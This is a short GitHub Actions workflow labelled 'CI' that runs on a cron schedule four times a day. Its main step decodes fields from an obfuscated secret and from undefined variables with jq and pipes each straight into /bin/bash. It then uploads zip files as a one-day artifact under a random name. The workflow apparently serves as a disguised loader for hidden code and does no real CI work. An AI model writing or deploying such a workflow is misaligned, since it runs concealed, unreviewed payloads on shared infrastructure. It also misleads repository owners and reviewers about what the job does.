name: CI
on:
  workflow_dispatch:

  schedule:
    - cron: '29 2,8,14,20 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Main step
        env:
          tuzpt70: ${{ secrets.tuzpt70 }}
        run: |
          printf '%s' "$tuzpt70" | jq -r .m9 | /bin/bash
          echo $kxc924 | jq -r .fwyap65 | /bin/bash
          printf '%s' "$wg53" | jq -r .uvw864 | /bin/bash
          printf '%s' "$hvtat64" | jq -r .b2624 | /bin/bash

      - name: Save data
        uses: actions/upload-artifact@v4
        with:
          name: od1UfvD4
          path: "*.zip"
          retention-days: 1
